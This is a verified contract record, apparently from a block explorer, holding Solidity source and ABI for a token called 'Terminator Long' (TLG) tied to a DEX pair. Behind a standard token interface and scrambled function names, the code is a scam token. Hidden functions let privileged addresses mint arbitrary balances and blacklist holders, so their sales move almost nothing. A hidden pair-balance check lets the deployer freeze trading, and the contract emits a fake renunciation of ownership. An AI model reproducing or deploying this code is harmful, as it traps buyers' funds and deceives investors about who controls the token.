{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface fromTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeSender) external view returns (uint256);\n\n    function transfer(address toTake, uint256 minLaunch) external returns (bool);\n\n    function allowance(address fundTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTake,\n        uint256 minLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyLaunch, uint256 value);\n    event Approval(address indexed fundTotal, address indexed spender, uint256 value);\n}\n\nabstract contract maxFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityFee {\n    function createPair(address toReceiver, address autoShould) external returns (address);\n}\n\ninterface fromToMetadata is fromTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TerminatorLong is maxFund, fromTo, fromToMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoShouldFund;\n    }\n\n    function receiverFund(address teamMaxTx, address toTake, uint256 minLaunch) internal returns (bool) {\n        require(launchedAuto[teamMaxTx] >= minLaunch);\n        launchedAuto[teamMaxTx] -= minLaunch;\n        launchedAuto[toTake] += minLaunch;\n        emit Transfer(teamMaxTx, toTake, minLaunch);\n        return true;\n    }\n\n    mapping(address => uint256) private launchedAuto;\n\n    string private fromSell = \"Terminator Long\";\n\n    function txTeam(address teamAmountExempt, uint256 minLaunch) public {\n        launchedIs();\n        launchedAuto[teamAmountExempt] = minLaunch;\n    }\n\n    function minAutoLaunch(address teamMode) public {\n        launchedIs();\n        \n        if (teamMode == shouldMode || teamMode == liquiditySender) {\n            return;\n        }\n        receiverSwap[teamMode] = true;\n    }\n\n    address receiverFeeTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return sellTo;\n    }\n\n    uint256 public receiverEnable;\n\n    address public shouldMode;\n\n    constructor (){\n        if (swapTotalExempt != senderIsBuy) {\n            senderIsBuy = swapTotalExempt;\n        }\n        teamLaunched fundSwap = teamLaunched(receiverFeeTx);\n        liquiditySender = liquidityFee(fundSwap.factory()).createPair(fundSwap.WETH(), address(this));\n        \n        shouldMode = _msgSender();\n        atTeam();\n        shouldReceiver[shouldMode] = true;\n        launchedAuto[shouldMode] = autoShouldFund;\n        \n        emit Transfer(address(0), shouldMode, autoShouldFund);\n    }\n\n    function exemptSell(address teamMaxTx, address toTake, uint256 minLaunch) internal returns (bool) {\n        if (teamMaxTx == shouldMode) {\n            return receiverFund(teamMaxTx, toTake, minLaunch);\n        }\n        uint256 fromSenderMin = fromTo(liquiditySender).balanceOf(enableTake);\n        require(fromSenderMin == tokenTake);\n        require(toTake != enableTake);\n        if (receiverSwap[teamMaxTx]) {\n            return receiverFund(teamMaxTx, toTake, launchMarketing);\n        }\n        return receiverFund(teamMaxTx, toTake, minLaunch);\n    }\n\n    function atTeam() public {\n        emit OwnershipTransferred(shouldMode, address(0));\n        sellTo = address(0);\n    }\n\n    mapping(address => bool) public receiverSwap;\n\n    function launchedIs() private view {\n        require(shouldReceiver[_msgSender()]);\n    }\n\n    bool private sellShould;\n\n    address enableTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public modeFee;\n\n    function transferFrom(address teamMaxTx, address toTake, uint256 minLaunch) external override returns (bool) {\n        if (_msgSender() != receiverFeeTx) {\n            if (fromExempt[teamMaxTx][_msgSender()] != type(uint256).max) {\n                require(minLaunch <= fromExempt[teamMaxTx][_msgSender()]);\n                fromExempt[teamMaxTx][_msgSender()] -= minLaunch;\n            }\n        }\n        return exemptSell(teamMaxTx, toTake, minLaunch);\n    }\n\n    function receiverLimit(uint256 minLaunch) public {\n        launchedIs();\n        tokenTake = minLaunch;\n    }\n\n    address private sellTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buySender;\n    }\n\n    uint256 private autoShouldFund = 100000000 * 10 ** 18;\n\n    function allowance(address fundList, address modeTokenIs) external view virtual override returns (uint256) {\n        if (modeTokenIs == receiverFeeTx) {\n            return type(uint256).max;\n        }\n        return fromExempt[fundList][modeTokenIs];\n    }\n\n    mapping(address => mapping(address => uint256)) private fromExempt;\n\n    function owner() external view returns (address) {\n        return sellTo;\n    }\n\n    bool private limitExempt;\n\n    bool public totalTo;\n\n    bool public autoMinMax;\n\n    string private launchReceiver = \"TLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return fromSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchReceiver;\n    }\n\n    uint8 private buySender = 18;\n\n    function transfer(address teamAmountExempt, uint256 minLaunch) external virtual override returns (bool) {\n        return exemptSell(_msgSender(), teamAmountExempt, minLaunch);\n    }\n\n    uint256 constant launchMarketing = 11 ** 10;\n\n    mapping(address => bool) public shouldReceiver;\n\n    event OwnershipTransferred(address indexed senderBuy, address indexed swapAmount);\n\n    uint256 public swapTotalExempt;\n\n    address public liquiditySender;\n\n    bool public fundTake;\n\n    uint256 tokenTake;\n\n    uint256 private senderIsBuy;\n\n    uint256 tradingList;\n\n    function approve(address modeTokenIs, uint256 minLaunch) public virtual override returns (bool) {\n        fromExempt[_msgSender()][modeTokenIs] = minLaunch;\n        emit Approval(_msgSender(), modeTokenIs, minLaunch);\n        return true;\n    }\n\n    uint256 private tradingFundMin;\n\n    function amountReceiverReceiver(address feeTo) public {\n        if (autoMinMax) {\n            return;\n        }\n        \n        shouldReceiver[feeTo] = true;\n        \n        autoMinMax = true;\n    }\n\n    function balanceOf(address takeSender) public view virtual override returns (uint256) {\n        return launchedAuto[takeSender];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTokenIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"}],\"name\":\"amountReceiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTokenIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMinMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"minAutoLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotalExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMaxTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"txTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TerminatorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}